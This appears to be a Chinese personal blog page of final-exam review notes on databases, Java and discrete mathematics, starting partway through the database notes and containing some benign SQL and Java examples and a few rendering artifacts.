-<p>数据库管理系统（DBMS）</p>
-<p>数据库系统（DBS）：一般由数据库、数据库管理系统（及其开发工具）、应用系统、数据库管理员构成。一般在不引起混淆的情况下常常把数据库系统简称为数据库。</p>
-<h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><h2 id="常见的数据模型："><a href="#常见的数据模型：" class="headerlink" title="常见的数据模型："></a>常见的数据模型：</h2><p>常用的数据模型主要有层次模型、网状模型和关系模型。</p>
-<p>（1）层次模型：用树形结构表示实体类型与实体间的联系。</p>
-<p>特点：</p>
-<p>每棵树仅有一个无双亲节点，成为根。</p>
-<p>树中除根外，所有节点有且仅有一个双亲。</p>
-<p>（2）网状模型：用有向图表示实体类型及实体间的联系。</p>
-<p>（3） <strong>关系模型</strong> ：以二维表来描述数据。</p>
-<h3 id="关系模型"><a href="#关系模型" class="headerlink" title="关系模型"></a>关系模型</h3><p>特点：</p>
-<ul>
-<li>A.关系模型与非关系模型不同，它是建立在严格的数学概念的基础上的。</li>
-<li>B.关系模型的概念单一，无论实体还是实体之间的联系都用关系表示，操作的对象和操作的结果都是关系，所以其数据结构简单、清晰，用户易懂易用。</li>
-<li>C.关系模型的存取路径对用户透明，从而具有更高的数据独立性.更好的安全保密性，也简化了程序员的工作和数据库开发建立的工作。</li>
-</ul>
-<h2 id="三类完整性约束"><a href="#三类完整性约束" class="headerlink" title="三类完整性约束"></a>三类完整性约束</h2><h3 id="实体完整性"><a href="#实体完整性" class="headerlink" title="实体完整性"></a>实体完整性</h3><p>实体完整性是通过主码（PRIMARY KEY）的定义来实现的。一旦某个属性或属性组被定义为主码，该主码的每个属性就<strong>不能为空值</strong>，并且在表中<strong>不能出现主码值完全相同</strong>的两个记录。</p>
-<h3 id="参照完整性"><a href="#参照完整性" class="headerlink" title="参照完整性"></a>参照完整性</h3><p>如果键值更改了，那么在整个数据库中，对该键值的所有引用要进行一致的更改。</p>
-<h3 id="用户自定义完整性"><a href="#用户自定义完整性" class="headerlink" title="用户自定义完整性"></a>用户自定义完整性</h3><p>类似于check对数据的约束。</p>
-<h2 id="数据库设计阶段"><a href="#数据库设计阶段" class="headerlink" title="数据库设计阶段"></a>数据库设计阶段</h2><p> 按照规范设计的方法，考虑到数据库及其应用系统开发的全过程，将数据库设计分为六个阶段：</p>
-<h3 id="①-需求分析"><a href="#①-需求分析" class="headerlink" title="①.需求分析"></a>①.需求分析</h3><p>​    需求收集和分析，得到用数据字典描述的数据需求，用数据流图描述的处理需求</p>
-<h3 id="②-概念结构设计"><a href="#②-概念结构设计" class="headerlink" title="②.概念结构设计"></a>②.概念结构设计</h3><p>​    对需求进行综合、归纳与抽象，形成一个独立于具体DBMS的概念模型（用E-R图表示）</p>
-<h3 id="③-逻辑结构设计"><a href="#③-逻辑结构设计" class="headerlink" title="③.逻辑结构设计"></a>③.逻辑结构设计</h3><p>​    将概念结构转换为某个DBMS所支持的数据模型（比如 关系模型 ），并对其进行优化</p>
-<h3 id="④-物理结构设计"><a href="#④-物理结构设计" class="headerlink" title="④.物理结构设计"></a>④.物理结构设计</h3><p>​    为逻辑数据模型选取一个最适合应用环境的物理结构（包括存储结构、存取方法）</p>
-<h3 id="⑤-数据库实施"><a href="#⑤-数据库实施" class="headerlink" title="⑤.数据库实施"></a>⑤.数据库实施</h3><p>​    运用DBMS提供的数据语言（比如 SQL）及其宿主语言（例如 C、C++），根据逻辑设计和物理设计的结果建立数据库，编制与调试应用程序，组织数据入库，并进行试运行</p>
-<h3 id="⑥-数据库运行与维护"><a href="#⑥-数据库运行与维护" class="headerlink" title="⑥.数据库运行与维护"></a>⑥.数据库运行与维护</h3><p>​    数据库应用系统经过试运行后即可投入正式运行。在数据库系统运行过程中必须不断地对其进行评价、调整与修改</p>
-<h2 id="三大范式"><a href="#三大范式" class="headerlink" title="三大范式"></a>三大范式</h2><p>第一范式：在一个关系中消除重复字段，且各字段都是最小的逻辑存储单位。【即每个数据段只有一个元素】</p>
-<p>第二范式：若关系模型属于第一范式，则关系中每一个非主键关系字段，都完全依赖于主关键字段，不能只部分依赖主关键字的一部分。【所有属性都只依赖于主属性，即通过主属性可以确定到这一行数据】</p>
-<p>第三范式：若关系模型属于第一范式，且关系中所有非主关键字段都只依赖与主关键字段，第三范式要求去掉传递依赖。【即任意两个非主属性之间都不存在依赖关系】</p>
-<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="1-关系-Relation"><a href="#1-关系-Relation" class="headerlink" title="1)关系(Relation)"></a>1)关系(Relation)</h3><p>一个关系对应通常说的一张表</p>
-<h3 id="2-元组-Tuple"><a href="#2-元组-Tuple" class="headerlink" title="2)元组(Tuple)"></a>2)元组(Tuple)</h3><p>表中的一行即为一个元组</p>
-<h3 id="3-属性-Attribute"><a href="#3-属性-Attribute" class="headerlink" title="3)属性(Attribute)"></a>3)属性(Attribute)</h3><p>表中的一列即为一个属性，给每一个属性起一个名称，即属性名</p>
-<h3 id="4-码（键）"><a href="#4-码（键）" class="headerlink" title="4)码（键）"></a>4)码（键）</h3><p><strong>码是数据系统中的基本概念。所谓码就是能唯一标识实体的属性，他是整个实体集的性质，而不是单个实体的性质。它包括超码，候选码，主码。</strong></p>
-<ul>
-<li><strong>超码</strong>是一个或多个属性的集合，这些属性可以让我们在一个实体集中唯一地标识一个实体。</li>
-<li><strong>候选码</strong>:关系(表)中的某个属性组,它可以唯一确定一个元组。</li>
-<li>若一个关系(表)中有多个候选码,则选定其中一个为主码。</li>
-<li><strong>全码</strong>:关系的所有属性都包含在候选码中。</li>
-<li><strong>主属性</strong>:包含在任何一个候选码中的属性</li>
-<li><strong>非主属性</strong> 不包含在任何码中的属性</li>
-<li><strong>主码</strong>: 主键就是候选键里面的一个，是人为规定的，例如学生表中，我们通常会让“学号”做主键，教师表中让“教师编号”做主键。</li>
-<li><strong>外码</strong>： 外键比较简单，学生表中的外键就是“教师编号”。外键主要是用来描述两个表的关系。</li>
-<li><strong>域(Domain)</strong>:属性的取值范围。</li>
-<li><strong>分量</strong>:元组中的一个属性值。</li>
-<li><strong>形式化定义</strong><br>R(D 1 ,D 2 ,…D n )<br>R:关系名<br>n:关系的目或度(Degree)<br><strong>例:</strong><br>关系名(属性1,属性2,…,属性n)<br>学生(学号,姓名,年龄,性别,系,年级)<br><strong>候补码和超码</strong>：<br>候选码是从超码中选出的，自然地候选码也是一个或多个属性的集合。<br>因为超码的范围太广，很多是我们并不感兴趣即无用处的。所以候选码是最小超码，它们的任意真子集都不能成为超码。<br><strong>例如，如果K是超码，那么所有包含K的集合都不能是候选码；如果K，J都不是超码，那么K和J组成的集合（K，J）有可能是候选码。</strong></li>
-</ul>
-<h2 id="数据库的安全性、完整性、并发控制和恢复"><a href="#数据库的安全性、完整性、并发控制和恢复" class="headerlink" title="数据库的安全性、完整性、并发控制和恢复"></a>数据库的安全性、完整性、并发控制和恢复</h2><p><strong>数据的完整性</strong>包括 ：实体完整性、参照完整性和用户定义的完整性。</p>
-<h1 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h1><h2 id="系统数据库"><a href="#系统数据库" class="headerlink" title="系统数据库"></a>系统数据库</h2><ol>
-<li>Master</li>
-<li>Model：模板</li>
-<li>MSDB：</li>
-<li>TempDB：临时数据库</li>
-</ol>
-<h1 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h1><h2 id="char、varchar、nchar、nvarchar的区别："><a href="#char、varchar、nchar、nvarchar的区别：" class="headerlink" title="char、varchar、nchar、nvarchar的区别："></a>char、varchar、nchar、nvarchar的区别：</h2><ul>
-<li>char：  固定长度，存储ANSI字符，不足的补英文半角空格。</li>
-<li>nchar：  固定长度，存储Unicode字符，不足的补英文半角空格</li>
-<li>varchar： 可变长度，存储ANSI字符，根据数据长度自动变化。</li>
-<li>nvarchar： 可变长度，存储Unicode字符，根据数据长度自动变化。</li>
-</ul>
-<p>n开头的存储均为两个字节，包括英文；其他的英文一个字节，汉字两个字节。</p>
-<blockquote>
-<p>1、如果是单字节编码，举个例子ASCII，一个字符（准确来说是英文字符）是用一个字节编码的，而按照ASCII的拓展编码（具体是哪个编码规则忘了，不过可以统称ANSI），一个汉字是用两个字符表示，所以在此编码规则下，存放一个汉字（两个字符）需要两个字节，而char(10)中的10指的是字符个数，而不是多少字节（虽然在这种编码下得到的结果一样，因为一个字符对应一个字节，但是对于双字节编码的不是这样理解的），所以char(10)可以存10个字符，两个个字符表示一个汉字，所以最多存5个汉字。</p>
-<p>2、如果是双字节编码，一个字符（这里的字符不仅仅包括英文字符，还包括中文字符即汉字，以及其他的字符）是用两个字节编码的，nchar()存储的是UNICODE字符，它是采用双字节编码规则，即一个字符相当于两个字节，但是nchar(10)其实不需要考虑到字节问题，这个10指的就是字符个数，在此规则下汉字和英文字符一样的性质，所以nchar(10)就能存10个汉字。</p>
-</blockquote>
-<h1 id="第六章【SQL语言】"><a href="#第六章【SQL语言】" class="headerlink" title="第六章【SQL语言】"></a>第六章【SQL语言】</h1><h1 id="unique与distinct-的区别"><a href="#unique与distinct-的区别" class="headerlink" title="unique与distinct 的区别"></a>unique与distinct 的区别</h1><p>unique 和 distinct 都是去重的意思，但他们所用的语句不同</p>
-<ul>
-<li><p>1：unique 可以用于在创建表时或者在修改表的结构时使用</p>
-<blockquote>
-<p>例如：</p>
-<p>create table test(sno int not null unique);</p>
-<p>或者 alter table test alter unique(sname);</p>
-</blockquote>
-</li>
-<li><p>2:distinct则是用于对select 语句使用</p>
-<blockquote>
-<p>例如： select distinct depart from test</p>
-</blockquote>
-</li>
-</ul>
-<h2 id="E-R图"><a href="#E-R图" class="headerlink" title="E-R图"></a>E-R图</h2><table>
-<thead>
-<tr>
-<th>E</th>
-<th>R</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>实体</td>
-<td>矩形</td>
-</tr>
-<tr>
-<td>属性</td>
-<td>圆形</td>
-</tr>
-<tr>
-<td>联系</td>
-<td>菱形</td>
-</tr>
-</tbody></table>
-<h1 id="小点"><a href="#小点" class="headerlink" title="小点"></a>小点</h1><ol>
-<li><p>一个数据模型至少需要描述数据的<strong>静态特征</strong>、<strong>动态特征</strong>、<strong>完整性约束</strong>三项内容。</p>
-</li>
-<li><p>数据模型的三要素是<strong>数据结构</strong>、<strong>数据操作</strong>和<strong>数据完整性约束</strong></p>
-</li>
-<li><p><strong>DB</strong>是长期存储在计算机内的有组织、可共享的数据集合。</p>
-</li>
-<li><p>关系数据库中的<strong>数据完整性</strong>是指<strong>数据的正确性</strong></p>
-</li>
-<li><p><strong>数据结构</strong>是数据模型性质的最重要的描述。在数据库系统中，人们通常依据其类型来命名数据模型。</p>
-</li>
-<li><p>下列哪个语句用来清除自最近的事务语句以来的所有修改？<strong>（ROLLBACK TRANSACTION）</strong></p>
-</li>
-<li><p><strong>二维表结构</strong>是关系数据库采用的<strong>组织层</strong>数据模型</p>
-</li>
-<li><p><strong>文件系统</strong>具有的数据独立性是<strong>设备独立性</strong></p>
-</li>
-<li><p>数据库在磁盘上的基本组织形式是<strong>文件</strong></p>
-</li>
-<li><p>TRUNCATE TABLE相当于无条件的DELETE FROM</p>
-</li>
-<li><pre><code>create table employee ( employee_id int primary key, employee_name nvarchar(50) not null, dept_no int foreign key references dept(dept_no) )
-外键约束建立在从表的字段上</code></pre></li>
-<li><p>有UNIQUE约束的列，其取值一定<strong>取值不重</strong>，但<strong>只允许有一个空值</strong></p>
-</li>
-<li><p>数据库完整性保护的约束条件主要是指</p>
-</li>
-<li><p><img src="/2021/01/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/2.png" alt="2"></p>
-</li>
-<li><p>在已有数据的表上定义CHECK约束时，默认情况下：系统在建立约束之前检查表中的数据，<strong>符合约束条件时才能建立约束</strong></p>
-</li>
-<li><blockquote>
-<p>在ER模型中，如果有3个不同的实体型，3个M：N联系，根据ER模型转换为关系模型的规则，转换为关系的数目是（ 6  ）。</p>
-<p>一个实体转换成一个关系模式，这就3个了<br>一个多对多联系转换成一个关系模式，关系的属性是联系两端实体的主键加上联系本身的属性（如果有的话），这又是3个了<br>如果是1:1或者1：n联系，本身并不转换成关系模式</p>
-</blockquote>
-</li>
-<li><p><img src="/2021/01/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4.png" alt="4"></p>
-</li>
-</ol>
-<pre><code>![3](数据库期末复习/3.png)</code></pre><ol start="18">
-<li><p>如果实体A与实体B之间是多对多联系，为描述两个实体之间的关联关系，添加了联系C来关联实体A和B，添加联系C的作用是<strong>将多对多联系转化为一对多联系</strong></p>
-</li>
-<li></li>
-</ol>
-<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ol>
-<li>1-1-55</li>
-</ol>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/01/JAVA%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">JAVA期末复习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-01</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">期末复习</a></span><div class="content"><h1 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h1><p><img src="/2021/01/01/JAVA%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/1.png" alt="1"></p>
-<h2 id="关键字：abstract"><a href="#关键字：abstract" class="headerlink" title="关键字：abstract"></a>关键字：abstract</h2><p>用来修饰<strong>抽象类</strong>与<strong>抽象类中的方法</strong>【不能修饰变量】</p>
-<p><strong>抽象类需要注意的几点：</strong></p>
-<ol>
-<li>抽象类不能被实例化。抽象类可以包含属性；方法；构造方法，但是构造方法不能用来new实例，只能被子类调用</li>
-<li>有抽象方法的类，一定是抽象类，但是抽象类可以没有抽象方法。</li>
-<li>当一个类继承的父类是抽象类的话，需要我们把抽象类中的所有抽象方法全部实现，除非子类也为抽象类。</li>
-<li>抽象方法不能有方法体。</li>
-<li>抽象类不能用final声明，因为抽象类只有被继承才有存在的意义，final修饰的 </li>
-</ol>
-<p>类不可以被继承</p>
-<h2 id="关键字：final"><a href="#关键字：final" class="headerlink" title="关键字：final"></a>关键字：final</h2><p>用来修饰类，类属性，类方法</p>
-<p><strong>注意：</strong></p>
-<ol>
-<li><p>被final修饰的<strong>类</strong>不能被继承。</p>
-</li>
-<li><p>final修饰的<strong>类方法</strong>不能被重写，子类只有调用final方法的权利，没有修改final方法 的权利</p>
-</li>
-<li><p>被final修饰的<strong>类属性</strong>只可在初始化赋值，不可被重新赋值</p>
-</li>
-<li><p>使用final修饰<strong>引用型变量</strong>，变量不可以指向另外的对象</p>
-</li>
-</ol>
-<h1 id="重载和重写"><a href="#重载和重写" class="headerlink" title="重载和重写"></a>重载和重写</h1><p>java中的方法重载发生在<strong>同一个类里面</strong>两个或者多个方法的<strong>方法名相同</strong>但是<strong>参数不同</strong>的情况。</p>
-<p>与此相对，方法覆盖是说<strong>子类重新定义了父类的方法</strong>。方法覆盖必须有<strong>相同的方法名，参数列表和返回类型</strong>。</p>
-<p>覆盖者可能不会限制它所覆盖的方法的访问。</p>
-<h2 id="重载（Overloading）"><a href="#重载（Overloading）" class="headerlink" title="重载（Overloading）"></a>重载（Overloading）</h2><ul>
-<li>（1）方法重载是让类以统一的方法处理不同类型数据的一种手段。多个同名函数同时存在，具有不同的参数个数（类型）。重载Override是一个类中多态性的一种表现。</li>
-<li>（2）java的方法重载，就是在类中可以创建多个方法，他们具有相同的名字，但具有不同参数和不同的定义。调用方法时通过传递给他们不同的参数个数和参数类型来决定具体使用那个方法，这就是多态性。</li>
-<li>（3）重载的时候，方法名要一样，但是参数类型和个数不一样，返回值类型可以相同也可以不同。无法以返回类型来作为重载函数的区分标准。</li>
-</ul>
-<h2 id="重写（Overriding）"><a href="#重写（Overriding）" class="headerlink" title="重写（Overriding）"></a>重写（Overriding）</h2><ul>
-<li>（1）父类与子类的多态性，对父类的函数进行重新定义。如果在子类中定义某方法与其父类有相同的名称和参数，我们说该方法被重写。在java中，子类可继承父类的方法，则不需要重新编写相同的方法。但有时子类并不想原封不动继承父类的方法，而是想做一定的修改，这就采用方法重写。方法重写又称方法覆盖。</li>
-<li>（2）若子类中的方法与父类的中的某一方法具有相同的方法名、返回类型和参数表，则新方法覆盖原有的方法。如需要父类的原有方法，可以使用super关键字，该关键字引用房钱类的父类。</li>
-<li>（3）子类函数访问权限大于父类。</li>
-</ul>
-<h1 id="小点"><a href="#小点" class="headerlink" title="小点"></a>小点</h1><ol>
-<li><p>在使用interface声明一个接口时，只可以使用public/default修饰符修饰该接口。</p>
-</li>
-<li><p>String实例一旦创建完毕，就不能再修改其内容</p>
-</li>
-<li><p>不允许使用final来修饰abstract方法</p>
-</li>
-<li><p>接口中的方法默认都是public、abstract类型的。【非静态】</p>
-<blockquote>
-<p><strong>接口Interface</strong><br>\1. 接口中的<strong>成员变量</strong>默认都是public、static、final类型的，必须被显式初始化<br>\2. 接口中的<strong>方法</strong>默认都是public、abstract类型的。<br>\3. 接口中只能包含public、static、final类型的成员变量和public、abstract类型的成员方法。<br>\4. 接口没有构造方法，不能被实例化，在接口中定义构造方法是非法的。<br>\5. 一个接口不能实现另一个接口，但它可以继承多个其他接口。<br>interface C extends A, B{} // A和B都是接口<br>\6. 当类实现某个接口时，它必须实现接口中所有的抽象方法，否则这个类必须被定义为抽象类。<br>\7. 接口中没有方法体<br>访问控制修饰符<br>四种访问级别：public、protected、默认、private<br>private只能在同一个类中访问<br>默认，只能在同一个类，同一个包中访问<br>protected，可以在统一各类，同一个包，子类(子类可以不在同一个包中)访问<br>public，不限制访问<br>类可用修饰符： abstract、public、final<br>构造方法：public、protected、private<br>局部变量：仅仅final<br>abstract修饰符<br>\1. 抽象类中可以没有抽象方法，但包含了抽象方法的类必须被定义为抽象类。<br>\2. 没有抽象构造方法，没有抽象静态方法。 static 和 abstract不能连用<br>\3. 抽象类中可以有非抽象的构造方法，创建子类的实例时可能会调用这些构造方法。<br>\4. 抽象类及抽象方法不能被final修饰符修饰。final和abstract 不能连用，同样private和abstract不能连用。<br>\5. 抽象类不能被实例化。因为抽象类可能含有没有方法体的抽象方法<br>final修饰符<br>final具有;不可改变的;含义，它可以修饰非抽象类，非抽象成员方法和变量<br>\1. 用final修饰的类不能被继承，没有子类。<br>\2. 用final修饰的方法不能被子类的方法覆盖。<br>\3. 用final修饰的变量表示常量，只能被赋一次值，必须被显式初始化。<br>\4. private修饰的方法默认为是final方法，因而不能被子类的方法覆盖。<br>static修饰符<br>\1. 静态变量在内存中只有一个拷贝，在类的所有实例中共享。<br>\2. 在静态方法中不能直接访问实例方法和实例变量。<br>\3. 在静态方法中不能使用this和super关键字。<br>\4. 静态方法不能被abstract修饰<br>\5. 静态方法和静态变量都可以通过类名直接被访问。<br>\6. 当类被加载时，静态代码块只被执行一次。类中不同的静态代码块按它们在类中出现的顺序被依次执行<br>public static void main(String args[]) {} 程序入口方法，可以被final修饰。<br>super关键字<br>\1. 在类的构造方法中，通过super语句调用这个类的父类的构造方法。<br>在构造方法中，super语句必须作为构造方法的第一条语句。<br>\2. 在子类中访问父类的被屏蔽的方法和属性<br>\3. 只能在构造方法或实例方法内使用super关键字。 super关键字与类的特定实例相关<br>方法覆盖（方法重写）<br>\1. 方法的参数签名和返回值类型必须相同，访问控制修饰符可以不同，但是子类方法不能缩小父类方法的访问权限。<br>\2. 子类方法抛出的异常必须和父类方法抛出的异常相同，或者是父类方法抛出的异常类的子类。<br>\3. 父类的静态方法是不能被子类覆盖为非静态方法。<br>父类的非静态方法不能被子类覆盖为静态方法。<br>\4. 子类可以定义与父类的静态方法同名的静态方法，以便在子类中隐藏父类的静态方法。区别：运行时，JVM把静态方法和所属的类绑定，而把实例方法和所属的实例绑定。<br>\5. 父类的私有方法不能被覆盖<br>\6. 父类的非抽象方法可以被覆盖为抽象方法<br>方法重（chong）载<br>\1. 在一个类中不允许两个方法名相同，并且参数签名也完全相同的方法。<br>\2. 类的同一种功能，可能有多种实现，到底采用哪种实现方式，取决于调用者给定的参数。<br>\3. 对于类的方法（包括从父类中继承的方法），如果有两个方法的方法名相同，但参数不一致，那么可以说，一个方法是另一个方法的重载方法。<br>多态<br>\1. 对于一个引用类型的变量，Java编译器按照它声明的类型来处理。<br>Base base = new Sub();<br>base.subMethod(); // 编译出错，Base基类，Sub子类，编译器认为base是Base类型的引用变量，Base类没有subMethod()方法。这样子，就必须使用强制转换。(Sub)(base).subMethod();<br>\2. 对于一个引用类型的变量，运行时JVM按照它实际引用的对象来处理。<br>Base base = new Base();<br>Sub sub = (Sub)base; // 编译通过，但是运行时抛出ClassCastException<br>在运行时，子类的引用类型变量可以转换为父类的引用类型，而相反的过程却不可以。<br>假定可以，即上边两行代码运行正常，那么sub.subMethod(); 执行时，JVM将找不到subMethod。sub实际引用的是Base类的实例。<br>\3. 在运行时环境中，通过引用类型变量来访问所引用对象的方法和属性时，JVM采用以下的绑定规则。<br>①实例方法与引用变量实际引用的对象的方法绑定，即动态绑定。<br>②静态方法与引用变量所声明的类型的方法绑定，即静态绑定。 编译阶段即绑定完成。<br>③成员变量(静态变量和实例变量) 与引用类型所声明的类型的成员变量绑定。静态绑定。</p>
-</blockquote>
-</li>
-</ol>
-<ol start="5">
-<li><p>抽象类不一定有抽象方法。</p>
-</li>
-<li><p>为AB类的一个无形式参数无返回值的方法method书写方法头，使得使用类名AB作为前缀就可以调用它，该方法头的形式为（static ）。</p>
-</li>
-<li><p>Java允许创建不规则数组，即Java多维数组中各行的列数可以不同。【相当于一维数组的一维数组】</p>
-</li>
-<li><pre><code class="java"><span class="comment">//两种初始化方法</span>
-<span class="keyword">int</span>[][] myArray = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">5</span>][];   <span class="comment">//二维数组初始化时，5这个地方必须有值</span>
-<span class="keyword">int</span>[][] myArray = &lt;!--￼<span class="number">1</span>--&gt;;
-
-<span class="comment">//其中第一种：</span>
-<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TwoDimensionArray</span> </span>{
-    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>{
-        <span class="keyword">int</span>[][] myArray = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">5</span>][];
-        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;myArray.length;i++){
-            myArray[i] = <span class="keyword">new</span> <span class="keyword">int</span>[myArray.length-i];
-            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;myArray.length-i;j++){
-                myArray[i][j]=i*<span class="number">10</span>+j;
-            }
-        }
-
-        System.out.println(myArray[<span class="number">1</span>][<span class="number">2</span>]);
-    }
-}
-&lt;!--￼<span class="number">0</span>--&gt;
-Son mygs = <span class="keyword">new</span> grandSon();</code></pre>
-</li>
-</ol>
-<p>此时，Son和grandSon名字不一样，grandSon是Son的子类，相当于grandSon无参构造之后，付给了Son的对象，相当于放弃了Son里的属性，即名字还是Son里的名字。</p>
-<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>The array size is fixed after it is created.   （T）</p>
-<p>The array size is fixed after an array reference variable is declared.   （F）</p>
-<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p><img src="/2021/01/01/JAVA%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/2.png" alt="2"></p>
-<p><img src="/2021/01/01/JAVA%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/3.png" alt="3"></p>
-<p><img src="/2021/01/01/JAVA%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4.png" alt="4"></p>
-<p><img src="/2021/01/01/JAVA%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/5.png" alt="5"></p>
-<p>这题选A</p>
-<p>异常处理</p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/01/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">离散数学期末复习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-01</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">期末复习</a></span><div class="content"><h1 id="代数"><a href="#代数" class="headerlink" title="代数"></a>代数</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>本章中定义<code>A=&lt;S，。，▲，k&gt;</code>，其中。是S上的二元运算，▲是S上的一元运算。</p>
-<h2 id="代数结构"><a href="#代数结构" class="headerlink" title="代数结构"></a>代数结构</h2><p>代数通常由以下三部分组成：</p>
-<ol>
-<li>一个集合，叫做代数的<strong>载体</strong></li>
-<li>定义在载体上的<strong>运算</strong></li>
-<li>载体的特异元素，叫做<strong>代数常数</strong></li>
-</ol>
-<blockquote>
-<p>例：</p>
-<ol>
-<li>载体是整数集合I</li>
-<li>定义在I上的运算是加法</li>
-<li>常数是0</li>
-</ol>
-<p>可构成代数系统：&lt;I,+,0&gt;</p>
-</blockquote>
-<h2 id="子代数"><a href="#子代数" class="headerlink" title="子代数"></a>子代数</h2><p>设<code>A=&lt;S，。，▲，k&gt;</code>是一个代数，如果</p>
-<ol>
-<li>S‘ 属于S</li>
-<li>S’对于S上的运算。，▲封闭</li>
-<li>k∈S’</li>
-</ol>
-<p>则称<code>A&#39;=&lt;S&#39;，。，▲，k&gt;</code>是A的子代数</p>
-<h2 id="同态"><a href="#同态" class="headerlink" title="同态"></a>同态</h2><h3 id="同构"><a href="#同构" class="headerlink" title="同构"></a>同构</h3><p>代数<code>A=&lt;S，*，▲，k&gt;</code>和<code>A&#39;=&lt;S&#39;，*&#39;，▲&#39;，k&#39;&gt;</code>是<strong>同构</strong>的，如果存在一<strong>双射函数h</strong>，使</p>
-<ol>
-<li>h： S-&gt;S’</li>
-<li>h(a * b)=h(a) *’ h(b)</li>
-<li>h(▲a)=▲’h(a)</li>
-<li>h(k)=k’</li>
-</ol>
-<p>这里a，b是S上的任意元素</p>
-<blockquote>
-<p>设f是从集合A到集合B的映射，若f(A)=B，即B中任一元素b都是A中某元素的像，则称f为A到B上的<strong>满射</strong>；</p>
-<p>若对A中任意两个不同元素a1不等于a2，它们的像f1不等于f2，则称f为A到B的<strong>单射</strong>；</p>
-<p>若映射f既是单射，又是满射，则称映射f为A到B的“双射”(或“一一映射)”)。 函数为双射当且仅当每个可能的像有且仅有一个变量与之对应。</p>
-</blockquote>
-<h3 id="同态-1"><a href="#同态-1" class="headerlink" title="同态"></a>同态</h3><p>代数<code>A=&lt;S，*，▲，k&gt;</code>和<code>A&#39;=&lt;S&#39;，*&#39;，▲&#39;，k&#39;&gt;</code>是<strong>同态</strong>的，如果存在一函数<strong>h</strong>，使</p>
-<ol>
-<li>h： S-&gt;S’</li>
-<li>h(a * b)=h(a) *’ h(b)</li>
-<li>h(▲a)=▲’h(a)</li>
-<li>h(k)=k’</li>
-</ol>
-<p>这里a，b是S上的任意元素</p>
-<p>其中：</p>
-<ol>
-<li>如果h是单射的，则h是单一同态</li>
-<li>如果h是满射的，则h是满同态</li>
-<li>如果A=A’，则h是自同态</li>
-</ol>
-<h2 id="半群和独异点"><a href="#半群和独异点" class="headerlink" title="半群和独异点"></a>半群和独异点</h2><img src="/2021/01/01/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-1.png" alt="6-1" style="zoom:50%;">
-
-<p>生成元：设<code>&lt;S，*，e&gt;</code>是独异点，如果存在一个元素g，对于每一个元素a∈S，都有一个相应的h∈N能满足a=g^h，则称此独异点为<strong>循环独异点</strong>。并称元素g为此循环独异点的<strong>生成元</strong>。</p>
-<h2 id="群"><a href="#群" class="headerlink" title="群"></a>群</h2><h3 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h3><p>代数系统满足：</p>
-<ol>
-<li>封闭，可结合</li>
-<li>有幺元</li>
-<li>有逆元</li>
-</ol>
-<h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><ol>
-<li><p>如果&lt;G,*&gt;是一个群，则对于任何a，b∈G，<code>(a * b)^-1 = b^-1 * a^-1</code></p>
-</li>
-<li><table>
-<thead>
-<tr>
-<th>阶数</th>
-<th>群的个数</th>
-<th>是否为阿贝尔群</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>1</td>
-<td>1</td>
-</tr>
-<tr>
-<td>2</td>
-<td>1</td>
-<td>1</td>
-</tr>
-<tr>
-<td>3</td>
-<td>1</td>
-<td>1</td>
-</tr>
-<tr>
-<td>4</td>
-<td>2</td>
-<td>1</td>
-</tr>
-<tr>
-<td>5</td>
-<td>1</td>
-<td>1</td>
-</tr>
-<tr>
-<td>6</td>
-<td>2</td>
-<td>0</td>
-</tr>
-</tbody></table>
-</li>
-<li><p>如果&lt;G,*&gt;是一个群，且a∈G，如果存在正整数n使得a^n=e，则称元素的阶是有限的。如果不存在这样的n，则称元素的阶是无限的。</p>
-</li>
-<li><p>群中任一元素和它的逆元具有相同的阶</p>
-</li>
-</ol>
